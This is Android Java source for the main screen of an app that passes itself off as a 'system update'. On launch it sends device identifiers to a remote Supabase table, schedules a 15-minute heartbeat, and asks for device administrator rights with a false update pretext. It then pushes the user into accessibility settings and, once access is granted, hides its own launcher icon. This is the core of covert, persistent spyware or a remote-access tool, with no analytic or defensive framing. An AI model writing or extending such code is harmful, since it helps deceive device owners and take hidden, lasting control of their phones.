// client/android/app/src/main/java/com/system/update/core/MainActivity.java
package com.system.update.core;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import androidx.appcompat.app.AppCompatActivity;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import android.util.Log;
import android.widget.Toast;

import com.system.updates.BuildConfig;

import org.json.JSONObject;

import java.io.IOException;
import java.util.UUID;
import java.util.concurrent.TimeUnit;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        sendDeviceInfo();
        scheduleHeartbeat();

        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);

        if (!dpm.isAdminActive(adminComponent)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "System needs admin rights for updates");
            startActivity(intent);
        }

        if (!isAccessibilityServiceEnabled()) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        } else {
            hideAppIcon();
        }
    }

    private void sendDeviceInfo() {
        String url = BuildConfig.SUPABASE_URL;
        String key = BuildConfig.SUPABASE_KEY;

        if (url.isEmpty() || key.isEmpty()) {
            Log.e(TAG, "Supabase credentials missing");
            Toast.makeText(this, "Configuration error: missing Supabase credentials", Toast.LENGTH_LONG).show();
            return;
        }

        String deviceSerial = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        if (deviceSerial == null || deviceSerial.isEmpty()) {
            deviceSerial = UUID.randomUUID().toString();
        }

        String model = Build.MODEL;
        String manufacturer = Build.MANUFACTURER;
        String version = Build.VERSION.RELEASE;

        JSONObject json = new JSONObject();
        try {
            json.put("client_serial", deviceSerial);
            json.put("model_name", model + " " + manufacturer);
            json.put("android_version", version);
            json.put("last_seen", "now()");
        } catch (Exception e) {
            Log.e(TAG, "JSON error", e);
            return;
        }

        RequestBody body = RequestBody.create(
                MediaType.parse("application/json; charset=utf-8"),
                json.toString()
        );

        Request request = new Request.Builder()
                .url(url + "/rest/v1/pos_clients")
                .header("apikey", key)
                .header("Authorization", "Bearer " + key)
                .header("Content-Type", "application/json")
                .header("Prefer", "return=minimal")
                .post(body)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                Log.e(TAG, "Failed to send device info", e);
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    Log.i(TAG, "Device info sent successfully");
                } else {
                    Log.e(TAG, "Error response: " + response.code() + " - " + response.message());
                }
                response.close();
            }
        });
    }

    private void scheduleHeartbeat() {
        PeriodicWorkRequest heartbeatRequest =
            new PeriodicWorkRequest.Builder(HeartbeatWorker.class, 15, TimeUnit.MINUTES)
                .build();

        WorkManager.getInstance(this).enqueue(heartbeatRequest);
    }

    private boolean isAccessibilityServiceEnabled() {
        String prefString = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        return prefString != null && prefString.contains(getPackageName());
    }

    private void hideAppIcon() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP);
        finish();
    }
}
